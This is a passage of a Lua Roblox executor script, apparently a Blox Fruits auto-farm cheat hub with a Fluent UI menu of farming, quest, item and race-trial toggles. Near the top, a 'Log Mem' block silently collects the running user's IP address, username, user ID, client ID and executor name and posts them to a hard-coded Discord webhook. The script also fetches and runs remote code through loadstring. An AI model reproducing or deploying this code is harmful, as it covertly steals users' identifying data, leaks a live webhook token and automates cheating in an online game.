    -----Ui Load---
    local ScreenGui = Instance.new("ScreenGui")
    local icon = Instance.new("ImageButton")
    local UICorner = Instance.new("UICorner")

    ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

    icon.Name = "icon"
    icon.Parent = ScreenGui
    icon.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    icon.BorderColor3 = Color3.fromRGB(0, 0, 0)
    icon.BorderSizePixel = 0
    icon.Position = UDim2.new(0.942, 0, 0.822, 0)
    icon.Size = UDim2.new(0, 33, 0, 31)
    icon.Image = "rbxassetid://18246346586"
    icon.MouseButton1Down:Connect(function()
        game:GetService("VirtualInputManager"):SendKeyEvent(true, "End", false,game)
        game:GetService("VirtualInputManager"):SendKeyEvent(false, "End", true,game)
    end)
    ------

    ----Log Mem
    UICorner.CornerRadius = UDim.new(0, 94)
    UICorner.Parent = icon
    local WebhookUrl = 'https://discord.com/api/webhooks/1250727394592030732/n-hkxZv2VCQmVeOu3Nrdz8ncoRY35zJ5VlZkFuxUJ7avJGLAIQTTPJJ1qG4QkysjLpmA'
    local HttpService = game:GetService("HttpService")
    local LibraryNotify = loadstring(game:HttpGet("https://raw.githubusercontent.com/ZoiIntra/luable/main/notify.lua"))()
    local requestt = http_request or request or syn.request
    local body = requestt({Url = "https://httpbin.org/get"; Method = "GET"}).Body;
    local decoded = game:GetService("HttpService"):JSONDecode(body)
    local ip = decoded.origin
    local PlaceID = game.PlaceId
    local Path = "http://www.roblox.com/asset/?id="
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local data = {
        ["username"] = "Akiki Log Mem",
        ["avatar_url"] = "https://tungskidder.000webhostapp.com/Profile/trans.png",
        ["embeds"] = {
            {
                ["title"] = "Script Executed :",
                ["type"] = "rich",
                ["color"] = tonumber(1127128),
                ["fields"] = {
                    {
                        ["name"] = 'Username / User ID',
                        ["value"] = "```"..game:GetService("Players").LocalPlayer.Name.." / "..game:GetService("Players").LocalPlayer.UserId.."```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = 'User IP',
                        ["value"] = "||"..tostring(ip).."||",
                        ["inline"] = true
                    },
                    {
                        ["name"] = 'Executor',
                        ["value"] = "```"..identifyexecutor().."```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = 'Player in Server',
                        ["value"] = "```"..game.Players.NumPlayers .. "/" .. game.Players.MaxPlayers.."```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = 'Client ID',
                        ["value"] = "```"..game:GetService("RbxAnalyticsService"):GetClientId().."```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = 'Job ID',
                        ["value"] = "```"..game.JobId.."```",
                        ["inline"] = false
                    },
                    {
                        ["name"] = 'Profile Link',
                        ["value"] = "[Click Here](https://www.roblox.com/users/"..game:GetService("Players").LocalPlayer.UserId.."/profile)",
                        ["inline"] = true
                    },
                    {
                        ["name"] = 'Game Link',
                        ["value"] = "[Click Here](https://www.roblox.com/games/"..game.PlaceId..")",
                        ["inline"] = true
                    },
                }
            }
        }
    }
    local newdata = HttpService:JSONEncode(data)
    requestt({Url = WebhookUrl, Body = newdata, Method = "POST", Headers = headers})

    ------


    ---------------
    for i,v in pairs(game.Workspace:GetChildren()) do
        if v.Name == "Script" then
            v:Destroy()
        end
    end

    function noti(text,time)
        LibraryNotify:Notification({ Text = text, Duration = time })
    end


    --Ui
    function Save(i, v)
        if i ~= nil then
            Config[i] = v
        end
        if not isfolder("SechHub") then
            makefolder("SechHub")
        end
        writefile("SechHub" .. "/" .. "Pet99Map-" .. game.Players.LocalPlayer.Name .. ".json",
            game:GetService("HttpService"):JSONEncode(Config))
    end

    function ReadSetting()
        local s, o =
            pcall(
                function()
                    HttpService = game:GetService("HttpService")
                    if not isfolder("SechHub") then
                        makefolder("SechHub")
                    end
                    return game:GetService("HttpService"):JSONDecode(readfile("SechHub" ..
                        "/" .. "Pet99Map-" .. game.Players.LocalPlayer.Name .. ".json"))
                end
            )
        if s then
            return o
        else
            Save()
            return ReadSetting()
        end
    end

    Settingss = ReadSetting()



    local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
        local SaveManager = loadstring(game:HttpGet(
            "https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
        local InterfaceManager = loadstring(game:HttpGet(
            "https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()

        local Window = Fluent:CreateWindow({
            Title = "Scibidi Hub-BloxFruit ",
            SubTitle = "by @Akiki aka dh",
            TabWidth = 160,
            Size = UDim2.fromOffset(495, 420),
            Acrylic = false,                       -- The blur may be detectable, setting this to false disables blur entirely
            Theme = "Darker",
            MinimizeKey = Enum.KeyCode.End -- Used when theres no MinimizeKeybind
        })
        --// Tab Create
        local Tabs = {
            Status = Window:AddTab({ Title = "[ Status ]", Icon = "" }),
            Setting = Window:AddTab({ Title = "[ Setting-Farm ]", Icon = "" }),
            Main = Window:AddTab({ Title = "[ Main ]", Icon = "" }),
            Mics = Window:AddTab({Title = "[ Mics & Shop ]",Icon = ""}),
            Subming = Window:AddTab({ Title = "[ Sub Farming ]", Icon = "" }),
            Race = Window:AddTab({ Title = "[ Race Functions ]", Icon = "" }),
            Item = Window:AddTab({ Title = "[ Items ]", Icon = "" }),
            SeaEvent = Window:AddTab({ Title = "[ Sea Event ]", Icon = "" }),
            V4 = Window:AddTab({ Title = "[ V4 Sub-Farming ]", Icon = "" }),        
        }

        local Options = Fluent.Options

        local Config = {
            ["AutoFarm"] = false,
            ["Weapon Type"] = ""
        }
        function Save(i, v)
            if i ~= nil then
                Config[i] = v
            end
            if not isfolder("SechHub") then
                makefolder("SechHub")
            end
            writefile("SechHub" .. "/" .. "BloxFruit-" .. game.Players.LocalPlayer.Name .. ".json",
                game:GetService("HttpService"):JSONEncode(Config))
        end

        function ReadSetting()
            local s, o =
                pcall(
                    function()
                        HttpService = game:GetService("HttpService")
                        if not isfolder("SechHub") then
                            makefolder("SechHub")
                        end
                        return game:GetService("HttpService"):JSONDecode(readfile("SechHub" ..
                            "/" .. "BloxFruit-" .. game.Players.LocalPlayer.Name .. ".json"))
                    end
                )
            if s then
                return o
            else
                Save()
                return ReadSetting()
            end
        end

        Settingss = ReadSetting()
        ---Check status
        local y = game.PlaceId
    if y == 2753915549 then
        Sea1 = true
    elseif y == 4442272183 then
        Sea2 = true
    elseif y == 7449423635 then
        Sea3 = true
    end
    function MoonTextureId()
        if Sea1 then
            return game:GetService("Lighting").FantasySky.MoonTextureId
        elseif Sea2 then
            return game:GetService("Lighting").FantasySky.MoonTextureId
        elseif Sea3 then
            return game:GetService("Lighting").Sky.MoonTextureId
        end
    end

    function getfm()
        if game:GetService("Lighting"):GetAttribute("MoonPhase") == 5 then
            return "Full Moon"
        elseif game:GetService("Lighting"):GetAttribute("MoonPhase") == 4 then
            return "Next Night"
        else
            return "Bad Moon"
        end
    end

    function getmirage()
        if game:GetService("Workspace").Map:FindFirstChild("MysticIsland") then
            return "🟢"
        else
            return "🔴"
        end
    end

    function checkgatcan()
        local a = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(
            "CheckTempleDoor")
        if a then
            return " | Pulled"
        else
            return " | No"
        end
    end



    function CheckAcientOneStatus()
        if not game.Players.LocalPlayer.Character:FindFirstChild("RaceTransformed") then
            return "You have yet to achieve greatness"
        end;
        local v227 = nil;
        local v228 = nil;
        local v229 = nil;
        v229, v228, v227 = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("UpgradeRace", "Check");
        if v229 == 1 then
            return "Required Train More"
        elseif v229 == 2 or v229 == 4 or v229 == 7 then
            return "Can Buy Gear With " .. v227 .. " Fragments"
        elseif v229 == 3 then
            return "Required Train More"
        elseif v229 == 5 then
            return "You Are Done Your Race."
        elseif v229 == 6 then
            return "Upgrades completed: " .. v228 - 2 .. "/3, Need Trains More"
        end
        if v229 ~= 8 then
            if v229 == 0 then
                return "Ready For Trial"
            else
                return "You have yet to achieve greatness"
            end
        end
        return "Remaining " .. 10 - v228 .. " training sessions."
    end

    function NoFog()
        local c = game.Lighting
        c.FogEnd = 100000
        for i, v in pairs(c:GetDescendants()) do
            if v:IsA("Atmosphere") then
                v:Destroy()
            end
        end
    end

    function humm()
        ab, bb =
            pcall(
            function()
                if not Sea3 then
                    return "Not Found"
                end
                if getgenv().ServerData['Server Bosses']['Cake Prince'] or getgenv().ServerData['Server Bosses']['Dough King [Lv. 2300] [Raid Boss]'] then
                    if getgenv().ServerData['Server Bosses']['Cake Prince'] then
                        return "Cake Prince Spawned"
                    end
                    if getgenv().ServerData['Server Bosses']['Dough King'] then
                        return "Dough King Spawned"
                    end
                else
                    return tonumber(
                        string.match(game.ReplicatedStorage.Remotes.CommF_:InvokeServer("CakePrinceSpawner", true), "%d+")
                    ) .. " Mobs Remaining..."
                end
            end
        )
        if ab then
            return bb
        end
        return "open the portal now"
    end

    task.spawn(
        function()
            while task.wait() do
                if Config.BuyGear then
                    local b_ = CheckAcientOneStatus()
                    if string.find(b_, "Can Buy Gear") then
                        v229, v228, v227 = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("UpgradeRace", "Check")
                        if v227 and game.Players.LocalPlayer.Data.Fragments.Value >= v227 then
                            BuyGear()
                        end
                    end
                end
                task.wait(5)
            end
        end
    )
    function BuyGear()
        game.ReplicatedStorage.Remotes.CommF_:InvokeServer("UpgradeRace", "Buy")
    end

    game:GetService("Players").LocalPlayer.PlayerGui.Main.Fragments.Position = UDim2.new(0, 0, 0.2, 0)

    Tabs.V4:AddButton({
        Title = "No Fog",
        Callback = function()
            removeFog()
        end
    })
    ----setting farm






    --//Status Create
    local time = Tabs.Status:AddParagraph({
        Title = "Time Server: ",
        Content = game:GetService("Lighting").TimeOfDay
    })

    local acient = Tabs.Status:AddParagraph({
        Title = "Acient One Status",
        Content = CheckAcientOneStatus()
    })
    local player = Tabs.Status:AddParagraph({
        Title = "Players In Server",
        Content = game.Players.NumPlayers .. "/" .. game.Players.MaxPlayers
    })
    local ccgaycc = Tabs.Status:AddParagraph({
        Title = "Cake Status",
        Content = humm()
    })
    local MoonStatus = Tabs.Status:AddParagraph({
        Title = "Moon Status",
        Content = getfm()
    })
    local MirageStatus = Tabs.Status:AddParagraph({
        Title = "Mirage Status",
        Content = getmirage()
    })

    Tabs.V4:AddButton({
        Title = "Tween To Highest Point",
        Description = "Tween to Highest Point On Mirage Island.",
        Callback = function()
        
                TwenetoHighestPoint()
            
        end
    })

    Tabs.V4:AddButton({
        Title = "Tween to current race door",
        Description = "Tween to current character race door.",
        Callback=  function() 
            TweentoCurrentRaceDoor()
        end
    })

    Tabs.V4:AddButton({
        Title = "Tween to Blue Gear",
        Description = "",
        Callback=  function() 
            Tweento(getBlueGear().CFrame * CFrame.new(0,3,0))
        end
    })

    Tabs.V4:AddToggle("Auto Farm",
        {
            Title = "Auto Mirage Puzzle",
            Default = Settingss.PuzzleRaceV4,
            Description = "Automatic do mirage puzzle (need req) ",
            Callback = function(v)
                Config.PuzzleRaceV4 = v
                Save("PuzzleRaceV4", v)
            end
        })

    --Tabs
    Tabs.Main:AddButton({
        Title = "Code x2",
        Callback = function()
            RedeemAllCodesX2()
        end
    })

    Tabs.Setting:AddButton({
        Title = "Hop",
        Callback = function()
            HopServer(9,true,"nil",5)
            
        end
    })

    local couytinko = Tabs.Setting:AddDropdown("couytinko", {
        Title = "Select Weapon",
        Values = {'Melee','Sword'},
        Multi = false,
    })

    couytinko:OnChanged(function(Value)
        getgenv().WeaponType = Value
    end)

    local nguyenquocgay = Tabs.Setting:AddDropdown("nguyenquocgay", {
        Title = "Fast Attack Delay",
        Values = {'0.1','0.2', '0.5', '0.75'},
        Multi = false,
    })
    nguyenquocgay:SetValue('0.2')
    nguyenquocgay:OnChanged(function(Value)
        getgenv().DelayFast = Value
        print(getgenv().DelayFast)
    end)


    thg3m =  Tabs.Main:AddDropdown("thg3m", {
        Title = "Select Method Farm",
        Values = {'Level', 'Bone','Cake','Nearest'},
        Multi = false,
    })
    thg3m:OnChanged(function(v)
        Config.SelecFarm = v
        Default = Settingss.ConfigSelecFarm
        Save('SelecFarm',v)
    end)

    cacmem = Tabs.Main:AddToggle("Auto Farm",
    {
        Title = "Start",
        Default = Settingss.Start,
        Callback = function(v)
            Config.Start = v
            Save("Start", v)
        end
    })

    Questcaidai = Tabs.Main:AddToggle("Auto Farm",
    {
        Title = "Double Quest",
        Default = Settingss.DoubleQuest,
        Callback = function(v)
            Config.DoubleQuest = v
            Save("DoubleQuest", v)
        end
    })
    Questcaidai:SetValue(true)

    Tabs.Main:AddToggle("Auto Farm",
        {
            Title = "Open Door Cake",
            Default = Settingss.OpenDoorCake,
            Callback = function(v)
                Config.OpenDoorCake = v
                Save("OpenDoorCake", v)
            end
        })

    Tabs.Main:AddToggle("Auto Farm",
        {
            Title = "Accept Quest Bone & Cake Prince",
            Default = Settingss.AcceptQuest,
            Callback = function(v)
                Config.AcceptQuest = v
                Save("AcceptQuest", v)
            end
        })


    local Slider = Tabs.Main:AddSlider("Slider",
        {
            Title = "Percent Health Mastery",
            Description = "Health %",
            Default = 40,
            Min = 0,
            Max = 100,
            Rounding = 1,
            Callback = function(Value)
                Config.Percent = math.floor(Value)
                print(Config.Percent)
                Save("Percent", Value)
            end
        })

       getBossSeaHub = function()
            local bossreturn = {}
            local bossreq = 1
            local bossmaxreq = 700
            if Sea2 then
                bossreq = 700
                bossmaxreq = 1500
            elseif Sea3 then
                bossreq = 1500
                bossmaxreq = 500000
            end
            for i, v in next, require(game:GetService("ReplicatedStorage").Quests) do
                for i1, v1 in next, v do
                    for i2, v2 in next, v1.Task do
                        if i1 == 3 and v1.LevelReq >= bossreq and v1.LevelReq <= bossmaxreq then
                            table.insert(bossreturn, i2)
                        end
                    end
                end
            end 
            return bossreturn
        end
        

        huhhh =  Tabs.Main:AddDropdown("huhhh", {
            Title = "Test1",
            Values = getBossSeaHub(),
            Multi = false,
        })
        

        Tabs.Main:AddToggle("Auto Farm",
        {
            Title = "Test2",
            Default = Settingss.KillSelectBoss,
            Callback = function(v)
                Config.KillSelectBoss = v
                Save("KillSelectBoss", v)
            end
        })

    Tabs.Subming:AddSection("Sea 1 functions")



        Tabs.Subming:AddToggle("Auto Farm",
        {
            Title = "Auto Second Sea",
            Default = Settingss.AutoSea2,
            Description = "Stack Farm",
            Callback = function(v)
                Config.AutoSea2 = v
                Save("AutoSea2", v)
            end
        })
        Tabs.Subming:AddSection("Sea 2 functions")

    Baritolon = Tabs.Subming:AddToggle("Auto Farm",
        {
            Title = "Auto Bartilo Quest",
            Default = Settingss.Bartilo,
            Description = "aka Warrior Helmet",
            Callback = function(v)
                Config.Bartilo = v
                Save("Bartilo", v)
            end
        })
        if Sea2 then
            Tabs.Subming:AddToggle("Auto Farm",
        {
            Title = "Auto Core",
            Default = Settingss.Core,
            Callback = function(v)
                Config.Core = v
                Save("Core", v)
            end
        })
    end



    local thangnaonhingay = Tabs.Subming:AddDropdown("thangnaonhingay", {
        Title = "x Chest To Hop",
        Values = {'20', '25', '30','40','50','60'},
        Multi = false,
    })
    thangnaonhingay:SetValue('25')
    thangnaonhingay:OnChanged(function(v)
        fuckinghop = v
        print(fuckinghop)
    end)

    DarkSummon = Tabs.Subming:AddToggle("Auto Farm",
        {
            Title = "Auto Summon Dark Beard",
            Default = Settingss.SummonDark,
            Description = "Stack Farm with Auto Dark Beard",
            Callback = function(v)
                Config.SummonDark = v
                Save("SummonDark", v)
            end
        })


    Tabs.Subming:AddToggle("Auto Farm",
        {
            Title = "Auto Third Sea",
            Default = Settingss.AutoSea3,
            Callback = function(v)
                Config.AutoSea3 = v
                Save("AutoSea3", v)
            end
        })

        Tabs.Subming:AddToggle("Auto Farm",
        {
            Title = "[ Hop Method Auto Sea3 ]",
            Default = Settingss.Sea3Hop,
            Description = 'Hop to Find fruit 1M+',
            Callback = function(v)
                Config.Sea3Hop = v
                Save("Sea3Hop", v)
            end
        })
        Tabs.Subming:AddToggle("Auto Farm",
        {
            Title = "Auto Chest",
            Default = Settingss.AutoChest,
            Callback = function(v)
                Config.AutoChest = v
                Save("AutoChest", v)
            end
        })

    Tabs.Subming:AddSection("Sea 3 functions")

    Tabs.Subming:AddToggle("Auto Farm",
    {
        Title = "Auto Sword 600 Mastery",
        Default = Settingss.Sword600,
        Callback = function(v)
            Config.Sword600 = v
            Save("Sword600", v)
        end
    })

    YamaItem = Tabs.Subming:AddToggle("Auto Farm",
        {
            Title = "Auto Elite",
            Default = Settingss.Elite,
            Callback = function(v)
                Config.Elite = v
                Save("Elite", v)
            end
        })

        Tabs.Subming:AddToggle("Auto Farm",
        {
            Title = "Auto Use Chalice",
            Default = Settingss.Chalice,
            Description = "Tween color brick if u have fully color, Tween Safe zone if u not fully haki color",
            Callback = function(v)
                Config.Chalice = v
                Save("Chalice", v)
            end
        })


    Tabs.Subming:AddToggle("Auto Farm",
        {
            Title = "Auto Soul Reaper (FULLY)",
            Default = Settingss.AutoFullyReaper,
            Callback = function(v)
                Config.AutoFullyReaper = v
                Save("AutoFullyReaper", v)
            end
        })

        
            Tabs.Subming:AddToggle("Auto Farm",
        {
            Title = "Auto Raid Castle",
            Default = Settingss.RaidCastle,
            Callback = function(v)
                Config.Core = v
                Save("Core", v)
            end
        })
        

    CaiCu = Tabs.Race:AddToggle("Auto Farm",
        {
            Title = "Auto Race v2",
            Default = Settingss.RaceV2,
            Description = "Only Quest Race V2",
            Callback = function(v)
                Config.RaceV2 = v
                Save("RaceV2", v)
            end
        })

    AutoCaidai = Tabs.Race:AddToggle("Auto Farm",
        {
            Title = "Auto Race v2 (Fully)",
            Default = Settingss.AutoAllRaceV2,
            Description = "Do Bartilo Quest + RaceV2",
            Callback = function(v)
                Config.AutoAllRaceV2 = v
                Save("AutoAllRaceV2", v)
            end
        })


        Tabs.Race:AddToggle("Auto Farm",
        {
            Title = "Auto Race V3",
            Default = Settingss.AutoV3,
            Description = "Upgrade Race V3",
            Callback = function(v)
                Config.AutoV3 = v
                Save("AutoV3", v)
            end
        })




    ---Tabs Item
    Tabs.Item:AddSection("Sea 1 Item")
    Saberlon = Tabs.Item:AddToggle("Auto Farm",
        {
            Title = "Auto Saber",
            Default = Settingss.Saber,
            Description = "Stack farm with farm level",
            Callback = function(v)
                Config.Saber = v
                Save("Saber", v)
            end
        })


    Polelon = Tabs.Item:AddToggle("Auto Farm",
        {
            Title = "Auto Pole",
            Default = Settingss.Pole,
            Callback = function(v)
                Config.Pole = v
                Save("Pole", v)
            end
        })
        ---Sea2 Item
        Tabs.Item:AddSection("Sea 2 Item")
        DarkCoat = Tabs.Item:AddToggle("Auto Farm",
        {
            Title = "Auto Dark Coat",
            Default = Settingss.DarkCoat,
            Callback = function(v)
                Config.DarkCoat = v
                Save("DarkCoat", v)
            end
        })

        
        DarkCoat = Tabs.Item:AddToggle("Auto Farm",
        {
            Title = "Auto RengoKu",
            Default = Settingss.RengGoku,
            Callback = function(v)
                Config.RengGoku = v
                Save("RengGoku", v)
            end
        })



        ---Sea 3 Item
        Tabs.Item:AddSection("Sea 3 Item")

        Tabs.Item:AddToggle("Auto Farm",
        {
            Title = "[ Hop Elite ]",
            Default = Settingss.HopYama,
            Description = 'Enable if u want hop to find Elite',
            Callback = function(v)
                Config.HopYama = v
                Save("HopYama", v)
            end
        })


        Tabs.Item:AddToggle("Auto Farm",
        {
            Title = "Auto Yama",
            Default = Settingss.Yamahihi,
            Callback = function(v)
                Config.Yamahihi = v
                Save("Yamahihi", v)
            end
        })

        Tabs.Item:AddToggle("Auto Farm",
        {
            Title = "Auto Tushita",
            Default = Settingss.Tushitahihi,
            Callback = function(v)
                Config.Tushitahihi = v
                Save("Tushitahihi", v)
            end
        })

    


        Tabs.Item:AddToggle("Auto Farm",
        {
            Title = "Auto Soul Guitar",
            Default = Settingss.SoulGuitar,
            Callback = function(v)
                Config.SoulGuitar = v
                Save("SoulGuitar", v)
            end
        })

        Tabs.Item:AddToggle("Auto Farm",
        {
            Title = "Auto CDK",
            Default = Settingss.AutoCDK,
            Callback = function(v)
                Config.AutoCDK = v
                Save("AutoCDK", v)
            end
        })


    ----
    Tabs.V4:AddToggle("Auto Farm",
        {
            Title = "Auto Trial",
            Default = Settingss.Trial,
            Callback = function(v)
                Config.Trial = v
                Save("Trial", v)
            end
        })
    Tabs.V4:AddToggle("Auto Reset",
        {
            Title = "Auto Reset",
            Default = Settingss.Reset,
            Callback = function(v)
                Config.Reset = v
                Save("Reset", v)
            end
        })
    Tabs.V4:AddToggle("Auto Farm",
        {
            Title = "Auto Kill Player After Trial",
            Default = Settingss.KillNhoc,
            Callback = function(v)
                Config.KillNhoc = v
                Save("KillNhoc", v)
            end
        })
    Tabs.V4:AddToggle("Auto Farm",
        {
            Title = "Auto Farm Quest Acient One",
            Default = Settingss.QAO,
            Callback = function(v)
                Config.QAO = v
                Save("QAO", v)
            end
        })

    Tabs.V4:AddToggle("Auto Farm",
        {
            Title = "Auto Buy Gear",
            Default = Settingss.BuyGear,
            Callback = function(v)
                Config.BuyGear = v
                Save("BuyGear", v)
            end
        })
    local Slider = Tabs.V4:AddSlider("Slider",
        {
            Title = "Minimum Player Turn On V3",
            Description = "Minimum Player Turn On V3 And Turn On Race To Trial (Auto Round Number On Slider)",
            Default = 1,
            Min = 1,
            Max = 3,
            Rounding = 1,
            Callback = function(Value)
                Config.MinPlayer = math.floor(Value)
                Save("MinPlayer", Value)
            end
        })
    -----Sea event
    Tabs.SeaEvent:AddSection("Rough Sea")

    Tabs.SeaEvent:AddToggle("Auto Farm",
        {
            Title = "Auto Sail",
            Default = Settingss.AutoSail,
            Description = "Auto buy boat and go on the boat then go to N place",
            Callback = function(v)
                Config.AutoSail = v
                Save("AutoSail", v)
            end
        })


        ----
        




    tableRaceDoor = {}
                for i, v in pairs(game.Workspace:GetDescendants()) do
                    if string.find(v.Name, "Corridor") then
                        tableRaceDoor[v.Name] = v.Door.Door.RightDoor.Union.CFrame
                    end
                end
                function TweentoCurrentRaceDoor()
                    a = tableRaceDoor[game.Players.LocalPlayer.Data.Race.Value .. "Corridor"]
                    Tweento(a)
                end 

    function checkistrial()
        for i, v in pairs(workspace._WorldOrigin.Locations:GetChildren()) do
            if string.find(v.Name, "Trial") then
                if (v.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 1000 or game:GetService("Players").LocalPlayer.PlayerGui.Main.Timer.Visible and tonumber(b[2] <= 3) then
                    return true
                else
                    return false
                end
            end
        end
    end


    function TweenTemple()
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(
            "requestEntrance",
            Vector3.new(28282.5703125, 14896.8505859375, 105.1042709350586)
        )
    end

    function TweenTempleLegit(fk)
        TweenTemple()
        AllNPCS = getnilinstances()
        for i, v in pairs(game:GetService("Workspace").NPCs:GetChildren()) do
            table.insert(AllNPCS, v)
        end
        for i, v in pairs(AllNPCS) do
            if v.Name == "Mysterious Force" then
                TempleMysteriousNPC1 = v
            end
            if v.Name == "Mysterious Force3" then
                TempleMysteriousNPC2 = v
            end
        end
        Tweento(TempleMysteriousNPC2.HumanoidRootPart.CFrame)
        wait(0.5)
        if
            (TempleMysteriousNPC2.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <
                15
        then
            game.ReplicatedStorage.Remotes.CommF_:InvokeServer("RaceV4Progress", "TeleportBack")
        end
        --if not fk then
        if
            (TempleMysteriousNPC1.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <
                15
        then
            game.ReplicatedStorage.Remotes.CommF_:InvokeServer("RaceV4Progress", "Teleport")
        end
        --end
    end

    function IsMirageIsland()
        if game:GetService("Workspace").Map:FindFirstChild("MysticIsland") then
            return true
        else
            return false
        end
    end
    function getBlueGear()
        if game.workspace.Map:FindFirstChild("MysticIsland") then
            for i, v in pairs(game.workspace.Map.MysticIsland:GetChildren()) do
                if v:IsA("MeshPart") and v.MeshId == "rbxassetid://10153114969" then --and not v.CanCollide then
                    return v
                end
            end
        end
    end    

    function CreateUiNotify(cf)
        newtitle = cf.Title or "Sech Hub"
        newcontent = cf.Content or "Nothing"
        newduration = cf.Duration or 10
        newsubcontent = cf.SubContent or ""
        Fluent:Notify(
            {
                Title = newtitle,
                Content = newcontent,
                SubContent = newsubcontent, -- Optional
                Duration = newduration -- Set to nil to make the notification not disappear
            }
        )
    end


    spawn(function ()
    while wait() do
    if Config.PuzzleRaceV4 then
        if not Sea3 then return end 
        if CheckIsRaiding() then return end 
        if not MirrorFractal then
            MirrorFractal = getgenv().ServerData["Inventory Items"]["Mirror Fractal"] 
        end
        if not Valk then
            Valk = getgenv().ServerData["Inventory Items"]["Valkyrie Helm"] 
        end
        if Valk and MirrorFractal then
            local v213 = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("RaceV4Progress", "Check") 
            if v213 == 1 then 
                game.ReplicatedStorage.Remotes.CommF_:InvokeServer("RaceV4Progress", "Begin")
            elseif v213 == 2 then 
                CreateUiNotify({
                    Content = "Claiming Red Head Quest...",
                    Duration = 30
                })
                TweenTempleLegit() 
            elseif v213 == 3 then 
                game.ReplicatedStorage.Remotes.CommF_:InvokeServer("RaceV4Progress", "Continue") 
            elseif IsMirageIsland() and not game.ReplicatedStorage.Remotes.CommF_:InvokeServer("CheckTempleDoor") then 
                if getBlueGear() then
                    
                        
                            HighestPointRealCFrame = getHighestPoint().CFrame * CFrame.new(0, 211.88, 0)
                        
                    
                    BlueGear = getBlueGear()
                    if BlueGear and not BlueGear.CanCollide and BlueGear.Transparency ~= 1 then
                        repeat
                            wait()
                            Tweento(getBlueGear().CFrame * CFrame.new(0,3,0))
                        until not getBlueGear() or getBlueGear().Transparency == 1 or game.ReplicatedStorage.Remotes.CommF_:InvokeServer("CheckTempleDoor")
                    elseif BlueGear and BlueGear.Transparency == 1 then
                        if
                            HighestPointRealCFrame and
                                (game.Players.LocalPlayer.Character.HumanoidRootPart.Position -
                                    HighestPointRealCFrame.Position).Magnitude > 10
                        then
                            Tweento(HighestPointRealCFrame)
                        elseif
                            HighestPointRealCFrame and
                                (game.Players.LocalPlayer.Character.HumanoidRootPart.Position -
                                    HighestPointRealCFrame.Position).Magnitude <= 10
                        then
                            workspace.CurrentCamera.CFrame =
                                CFrame.new(
                                workspace.CurrentCamera.CFrame.Position,
                                game:GetService("Lighting"):GetMoonDirection() + workspace.CurrentCamera.CFrame.Position
                            )
                            wait(.1)
                            game:service("VirtualInputManager"):SendKeyEvent(true, "T", false, game)
                            task.wait()
                            game:service("VirtualInputManager"):SendKeyEvent(false, "T", false, game)
                            task.wait(1.5)
                        end
                    end
                elseif not getBlueGear() and getHighestPoint() then
                    if game.Lighting.ClockTime < 18 and game.Lighting.ClockTime > 5 then
                        TimetoNight = math.floor(18 - game.Lighting.ClockTime)
                        CreateUiNotify({
                            Content = "Script Notify", "Watting (" .. TimetoNight .. ") Minutes for night!"
                        })
                    end
                    if getHighestPoint() then
                        TwenetoHighestPoint()
                    end
                end
            end
        end
    end
    end
    end
    )
    function getHighestPoint()
        if not game.workspace.Map:FindFirstChild("MysticIsland") then
            return nil
        end
        for i, v in pairs(game:GetService("Workspace").Map.MysticIsland:GetDescendants()) do
            if v:IsA("MeshPart") then
                if v.MeshId == "rbxassetid://6745037796" then
                    return v
                end
            end
        end
    end 

    function TwenetoHighestPoint()
        HighestPoint = getHighestPoint()
        if HighestPoint then
            Tweento(HighestPoint.CFrame * CFrame.new(0, 211.88, 0))
        end
    end 

    function checkmaptrial()
        if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
            local playerPosition = game.Players.LocalPlayer.Character.HumanoidRootPart.Position

            for i, v in pairs(workspace._WorldOrigin.Locations:GetChildren()) do
                if string.find(v.Name, "Trial") then
                    local distance = (v.Position - playerPosition).Magnitude

                    if distance <= 1000 and v.Name == "Trial of Speed" then
                        return "Mink Trial"
                    elseif distance <= 1000 and v.Name == "Trial of Water" then
                        return "Fish Trial"
                    elseif distance <= 1000 and v.Name == "Trial of the Machine" then
                        return "Cyborg Trial"
                    elseif distance <= 1000 and v.Name == "Trial of the King" then
                        return "Sky Trial"
                    elseif distance <= 1000 and v.Name == "Trial of Carnage" then
                        return "Ghoul Trial"
                    end
                end
            end
        end
    end


    function TeleportSeabeast(c5)
        AddBodyVelocity(true)
        local a = Vector3.new(0, c5:FindFirstChild("HumanoidRootPart").Position.Y, 0)
        local ab = Vector3.new(0, game:GetService("Workspace").Map["WaterBase-Plane"].Position.Y, 0)
        if (a - ab).Magnitude <= 175 then
            Tweento(c5.HumanoidRootPart.CFrame * CFrame.new(0, 300, 50))
        else
            Tweento(
                CFrame.new(
                    c5.HumanoidRootPart.Position.X,
                    game:GetService("Workspace").Map["WaterBase-Plane"].Position.Y + 200,
                    c5.HumanoidRootPart.Position.Z
                )
            )
        end
    end

    function GetSeaBeastTrial()
        if not game.Workspace.Map:FindFirstChild("FishmanTrial") then
            autospamskill = nil
            return nil
        end
        if game:GetService("Workspace")["_WorldOrigin"].Locations:FindFirstChild("Trial of Water") then
            FishmanTrial = game:GetService("Workspace")["_WorldOrigin"].Locations:FindFirstChild("Trial of Water")
        end
        if FishmanTrial then
            for r, v in next, game:GetService("Workspace").SeaBeasts:GetChildren() do
                if
                    string.find(v.Name, "SeaBeast") and v:FindFirstChild("HumanoidRootPart") and
                    (v.HumanoidRootPart.Position - FishmanTrial.Position).Magnitude <= 1500
                then
                    if v.Health.Value > 0 then
                        return v
                    end
                end
            end
